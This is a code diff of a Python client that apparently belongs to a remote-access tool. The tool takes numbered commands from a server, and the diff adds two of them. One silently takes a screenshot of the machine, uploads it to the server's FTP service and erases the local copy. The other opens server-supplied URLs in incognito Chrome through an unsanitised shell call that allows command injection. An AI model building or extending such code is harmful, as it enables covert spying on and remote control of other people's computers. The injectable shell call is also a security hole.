@@ -3,9 +3,10 @@
 # Description: Communicate with server
 
 import socket
+import subprocess
 from time import sleep
-from . import ssh, sftp
 from queue import Queue
+from . import ssh, sftp, screen
 from threading import Thread, RLock 
 
 class Shell(object):
@@ -23,7 +24,9 @@ class Shell(object):
                 1: self.ssh_obj,  
                 2: self.reconnect,
                 3: self.download,
-                4: self.upload,              
+                4: self.upload,   
+                5: self.screen,  
+                6: self.chrome,         
   }
 
  def listen_recv(self):
@@ -90,10 +93,20 @@ class Shell(object):
 
  def download(self, args):
   print('Downloading ...')
-  self.ftp = sftp.sFTP(self.services['ftp']['ip'], self.services['ftp']['port'], verbose=True)
+  self.ftp = sftp.sFTP(self.services['ftp']['ip'], self.services['ftp']['port'], self.home, verbose=True)
   self.ftp.recv()
 
  def upload(self, file):
   print('Uploading {}'.format(file))
-  self.ftp = sftp.sFTP(self.services['ftp']['ip'], self.services['ftp']['port'], verbose=True)
+  self.ftp = sftp.sFTP(self.services['ftp']['ip'], self.services['ftp']['port'], self.home, verbose=True)
   self.ftp.send(file)
+
+ def screen(self, args):
+  screen.screenshot()
+  self.upload(screen.file)
+  screen.clean_up()
+
+ def chrome(self, urls):
+  if '-1' in urls:return 
+  cmd = 'start chrome -incognito {}'.format(' '.join(urls))
+  subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
